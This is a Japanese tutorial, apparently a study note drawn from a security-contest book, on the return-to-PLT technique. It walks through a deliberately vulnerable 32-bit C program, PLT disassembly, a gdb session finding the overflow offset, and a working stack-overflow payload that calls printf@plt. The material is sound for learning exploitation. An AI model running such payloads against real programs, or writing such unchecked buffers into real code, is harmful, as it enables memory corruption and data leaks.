# Return to PLT(ret2plt)

## 前提
ここで書かれた内容を悪用してはいけません. あくまで攻撃手法の知識共有として残します.

## 本題

EIP(RIP)を奪った後の攻撃方法として, `ret2plt`があげられる.
**PLTは`Procedure Linkage Table`の略で, PLTに書かれた短いコード片を関数として呼び出すと、動的リンクされたライブラリの関数を呼び出すことができるはずだ**

という考えである.
実験コード
```
#include <stdio.h>
#include <string.h>

char buffer[32];

int main(int argc, char *argv[]) {
    char local[32];
    printf("buffer: 0x%x\n", &buffer);
    fgets(local, 128, stdin);
    strcpy(buffer, local);
    return 0;
}
```
```
gcc -m32 -fno-stack-protector -o bof3 bof3.c
```
```
$ ./bof3
buffer: 0x804a060
1
$ python -c 'print("A"*0x100)' | ./bof3
buffer: 0x804a060
Segmentation fault (core dumped)
```

bof3のPLTセクション
```
$ objdump -d -M intel -j .plt --no bof3

bof3:     file format elf32-i386


Disassembly of section .plt:

08048340 <.plt>:
 8048340:	push   DWORD PTR ds:0x804a004
 8048346:	jmp    DWORD PTR ds:0x804a008
 804834c:	add    BYTE PTR [eax],al
	...

08048350 <printf@plt>:
 8048350:	jmp    DWORD PTR ds:0x804a00c
 8048356:	push   0x0
 804835b:	jmp    8048340 <.plt>

08048360 <fgets@plt>:
 8048360:	jmp    DWORD PTR ds:0x804a010
 8048366:	push   0x8
 804836b:	jmp    8048340 <.plt>

08048370 <strcpy@plt>:
 8048370:	jmp    DWORD PTR ds:0x804a014
 8048376:	push   0x10
 804837b:	jmp    8048340 <.plt>

08048380 <__gmon_start__@plt>:
 8048380:	jmp    DWORD PTR ds:0x804a018
 8048386:	push   0x18
 804838b:	jmp    8048340 <.plt>

08048390 <__libc_start_main@plt>:
 8048390:	jmp    DWORD PTR ds:0x804a01c
 8048396:	push   0x20
 804839b:	jmp    8048340 <.plt>
```
PLTに存在し、実行結果が簡単に確認できる`printf@plt`をret2pltを用いて呼び出す.

`ret`命令はスタックから1つデータを取り出し、そのアドレスにジャンプする.
`call`命令で関数を呼び出した時は, スタックにリターンアドレスを積んでからジャンプを行う.
従って, ret命令で関数を呼び出すときはリターンアドレスをスタックに積んだ状態で行えばcall命令で関数を呼び出した時と同じ状態となる.

ret2pltの考え方を使ってC言語における`printf(buffer);`を実行するときのスタック状態は以下の通りとなる.

| | |
| --- | --- |
| 下位アドレス(0x00000000) | |
| ↓ | |
|関数アドレス(=リターンアドレス) | 08048350 (<printf@plt>) |
|prinf呼び出し後のリターンアドレス(`saved_ebp`) | 0x42424242(ダミー) |
|引数1 | 0x0804a060 |
| ↓ | |
|上位アドレス(0xffffffff) | |

bufferのグローバルアドレスは以下のようにして求めることができる
```
$ readelf -s bof3 | grep buffer
    54: 0804a060    32 OBJECT  GLOBAL DEFAULT   25 buffer
```

```
$ gdb -q bof3
Reading symbols from bof3...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x80484a0
gdb-peda$ r
Starting program: /home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3
[----------------------------------registers-----------------------------------]
EAX: 0xf7fbadd8 --> 0xffffd34c --> 0xffffd4bb ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
EBX: 0x0
ECX: 0x8f402fcc
EDX: 0xffffd2d4 --> 0x0
ESI: 0xf7fb9000 --> 0x1d7d6c
EDI: 0x0
EBP: 0xffffd2a8 --> 0x0
ESP: 0xffffd2a8 --> 0x0
EIP: 0x80484a0 (<main+3>:	and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048498 <frame_dummy+40>:	jmp    0x8048410 <register_tm_clones>
   0x804849d <main>:	push   ebp
   0x804849e <main+1>:	mov    ebp,esp
=> 0x80484a0 <main+3>:	and    esp,0xfffffff0
   0x80484a3 <main+6>:	sub    esp,0x30
   0x80484a6 <main+9>:	mov    DWORD PTR [esp+0x4],0x804a060
   0x80484ae <main+17>:	mov    DWORD PTR [esp],0x8048590
   0x80484b5 <main+24>:	call   0x8048350 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2a8 --> 0x0
0004| 0xffffd2ac --> 0xf7df9e81 (<__libc_start_main+241>:	add    esp,0x10)
0008| 0xffffd2b0 --> 0x1
0012| 0xffffd2b4 --> 0xffffd344 --> 0xffffd484 ("/home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3")
0016| 0xffffd2b8 --> 0xffffd34c --> 0xffffd4bb ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0020| 0xffffd2bc --> 0xffffd2d4 --> 0x0
0024| 0xffffd2c0 --> 0x1
0028| 0xffffd2c4 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484a0 in main ()
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ c
Continuing.
buffer: 0x804a060
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0xffffd2f0 ("AA8AANAAjAA9AAO")
EDX: 0x804a0d0 ("AA8AANAAjAA9AAO")
ESI: 0xf7fb9000 --> 0x1d7d6c
EDI: 0x0
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd2b0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd2b0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0004| 0xffffd2b4 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0008| 0xffffd2b8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0012| 0xffffd2bc ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0016| 0xffffd2c0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0020| 0xffffd2c4 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0024| 0xffffd2c8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
0028| 0xffffd2cc ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ patto AFAA
AFAA found at offset: 44
```
パターン文字列の44文字目以降に`AFAA`が現れることが分かりました.
アドレスの埋め込み先が分かったので, 次はどこに実行位置を移動するかを考える.
前述の通り, それは`08048350 (<printf@plt>)`であり, ダミー変数とbufferのアドレスも図の通りに埋め込むと
```
 python -c 'print("A"*44)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x83\x04\x08BBBB\x60\xa0\x04\x08' | ./bof3
buffer: 0x804a060
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPBBBB`�
Segmentation fault (core dumped)
```
とret2pltが成功し, `printf(buffer)`が実行されていることが確認できた.

例えば, `puts`や`write`などのメモリから標準出力に書き込む関数があればメモリのデータをリークすることができ、`fgets`や`read`などの標準入力からメモリに読み込む関数があればメモリに書き込むことが可能である.

参考
セキュリティコンテストチャレンジブック